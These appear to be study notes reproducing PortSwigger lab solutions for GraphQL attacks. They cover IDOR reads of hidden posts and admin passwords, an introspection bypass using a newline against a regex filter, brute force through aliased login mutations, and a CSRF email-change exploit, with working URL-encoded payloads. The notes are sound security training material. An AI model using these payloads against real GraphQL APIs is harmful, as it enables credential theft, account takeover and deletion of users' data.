# Table of Contents

- [[#Accessing private GraphQL posts]]
- [[#Accidental exposure of private GraphQL fields]]
- [[#Finding a hidden GraphQL endpoint]]
- [[#Bypassing GraphQL brute force protections]]
- [[#Performing CSRF exploits over GraphQL]]

# Accessing private GraphQL posts
Reference: https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts

```ad-done
title: Solution
1. In Burp's browser, access the blog page.
    
2. In Burp, go to **Proxy > HTTP history** and notice the following:
    
    - Blog posts are retrieved using a GraphQL query.
    - In the response to the GraphQL query, each blog post has its own sequential `id`.
    - Blog post `id` 3 is missing from the list. This indicates that there is a hidden blog post.
3. Use InQL to scan the GraphQL endpoint. Notice that the `BlogPost` type has a `postPassword` field available.
    
4. In Burp's browser, select a blog post. Notice that this causes the site to make a GraphQL query that fetches the relevant post data via a direct reference to the post's ID.
    
5. In the HTTP history, find the relevant GraphQL query. Right-click it and select **Send to Repeater**.
    
6. In Repeater, modify the `id` variable to 3 (that is, the `id` of the hidden blog post). Add the `postPassword` field to the query.
    
7. Send the request.
    
8. Copy the contents of the response's `postPassword` field and paste them into the **Submit solution** dialog to solve the lab.
```

# Accidental exposure of private GraphQL fields
Reference: https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure
```ad-done
title: Solution
1. In Burp's browser, access the lab and select **My account**.
    
2. Attempt to log in to the site.
    
3. In Burp, go to **Proxy > HTTP history** and notice that the login attempt is sent as a GraphQL mutation containing a username and password.
    
4. Right-click the login request and select **Send to Repeater**.
    
5. Use InQL to scan the GraphQL endpoint. Notice the following:
    
    - There is a `getUser` query that returns a user's username and password.
    - This query fetches the relevant user information via a direct reference to an `id` number.
6. Copy the contents of the `getUser` query.
    
7. Go to the **Repeater** tab and select the **InQL** subtab.
    
8. Paste the contents of the `getUser` query into the `Query` box, replacing the original GraphQL login mutation.
    
9. Select the **Pretty** tab and remove the `operationName` property.
    
10. Click **Send**. Notice that the default `1334` user ID causes the API to return an error.
    
11. Test alternative user IDs until the API returns the administrator's credentials. In this case, the administrator's ID is `1`.
    
12. Log in to the site as the administrator, go to the **Admin** panel, and delete `carlos` to solve the lab.
```

# Finding a hidden GraphQL endpoint
Reference: https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint

```ad-done
title: Solution
1. In Repeater, send requests to some common GraphQL endpoint suffixes and inspect the results.
    
2. Note that when you send a GET request to `/api` the response contains a "Query not present" error. This hints that there may be a GraphQL endpoint responding to GET requests at this location.
    
3. Amend the request to contain a universal query. Note that, because the endpoint is responding to GET requests, you need to send the query as a URL parameter.
    
    For example:
    
    ~~~
    /api?query=query{__typename}
    ~~~
    
4. Notice that the response confirms that this is a GraphQL endpoint:
    
    ~~~
    { "data": { "__typename": "query" } }
    ~~~
1. Send a new request with a URL-encoded introspection query as a query parameter.
    
    For example:
    
    ~~~
    /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
    ~~~
1. Notice from the response that introspection is disallowed.
    
7. Modify the query to include a newline character after `__schema` and resend.
    
    For example:
    
    ~~~
    /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
    ~~~
1. Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex `"__schema{"`, which the query no longer matches even though it is still a valid introspection query.
    
9. Save the introspection response body as a local JSON file.
    
10. Go to the **InQL Scanner** tab and scan the saved file.
    
11. Browse the schema and find the `getUser` query.
    
12. In Repeater, send the `getUser` query to the endpoint you discovered. Note that you need to convert the query to URL encoding.
    
    For example:
    
    ~~~
    /api?query=query%20%7B%0A%09getUser(id%3A1334)%20%7B%0A%09%09id%0A%09%09username%0A%09%7D%0A%7D
    ~~~
1. Notice that the default `1334` user ID causes the API to return an error.
    
14. Test alternative user IDs until the API confirms `carlos`'s user ID. In this case, the relevant user ID is `3`.
    
15. In the **InQL Scanner** tab, browse the schema again and find the `deleteOrganizationUser` mutation. Notice that this mutation takes a user ID as a parameter.
    
16. In Repeater, send a `deleteOrganizationUser` mutation with a user ID of `3` to delete `carlos` and solve the lab.
    
    For example:
    
    ~~~
    /api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
    ~~~
```

# Bypassing GraphQL brute force protections
Reference: https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass

```ad-done
title: Solution
1. In Burp's browser, access the lab and select **My account**.
    
2. Attempt to log in to the site.
    
3. In Burp, go to **Proxy > HTTP history**. Note that login requests are sent as a GraphQL mutation.
    
4. Right-click the login request and select **Send to Repeater**.
    
5. In Repeater, attempt some further login requests. Note that after a short period of time the API starts to return a rate limit error.
    
6. Craft a request that uses aliases to send multiple login mutations in one message. See the lab instructions for a tip that will make this process less time-consuming.
    
    Bear the following in mind when constructing your request:
    
    - The list of aliases should be contained within a `mutation {}` type.
    - Each aliased mutation should have the username `carlos` and a different password from the authentication list.
    - If you are modifying the request that you sent to Repeater, delete the variable dictionary and `operationName` field from the request before sending. You can do this from Repeater's **Pretty** tab.
    - Ensure that each alias requests the `success` field, as shown in the simplified example below:
    
    ~~~
    mutation { bruteforce0:login(input:{password: "123456", username: "carlos"}) { token success } bruteforce1:login(input:{password: "password", username: "carlos"}) { token success } ... bruteforce99:login(input:{password: "12345678", username: "carlos"}) { token success } }
    ~~~
1. Click **Send**.
    
8. Notice that the response lists each login attempt and whether its login attempt was successful.
    
9. Use the search bar below the response to search for the string `true`. This indicates which of the aliased mutations was able to successfully log in as `carlos`.
    
10. Check the request for the password that was used by the successful alias.
    
11. Log in to the site using the `carlos` credentials to solve the lab.
```

# Performing CSRF exploits over GraphQL
Reference: https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api

```ad-done
title: Solution
1. Open Burp's browser, access the lab and log in to your account.
    
2. Enter a new email address, then click **Update email**.
    
3. In Burp, go to **Proxy > HTTP history** and check the resulting request. Note that the email change is sent as a GraphQL mutation.
    
4. Right-click the email change request and select **Send to Repeater**.
    
5. In Repeater, amend the GraphQL query to change the email to a second different address.
    
6. Click **Send**.
    
7. In the response, notice that the email has changed again. This indicates that you can reuse a session cookie to send multiple requests.
    
8. Convert the request into a POST request with a `Content-Type` of `x-www-form-urlencoded`. To do this, right-click the request and select **Change request method** twice.
    
9. Notice that the mutation request body has been deleted. Add the request body back in with URL encoding.
    
    The body should look like the below:
    
    ~~~
    query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
    ~~~
    
10. Right-click the request and select **Engagement tools > Generate CSRF PoC**. Burp displays the **CSRF PoC generator** dialog.
    
11. Amend the HTML in the **CSRF PoC generator** dialog so that it changes the email a third time. This step is necessary because otherwise the exploit won't make any changes to the current email address at the time it is run. Likewise, if you test the exploit before delivering, make sure that you change the email from whatever it is currently set to before delivering to the victim.
    
12. Copy the HTML.
    
13. In the lab, click **Go to exploit server**.
    
14. Paste the HTML into the exploit server and click **Deliver exploit to victim** to solve the lab.
```

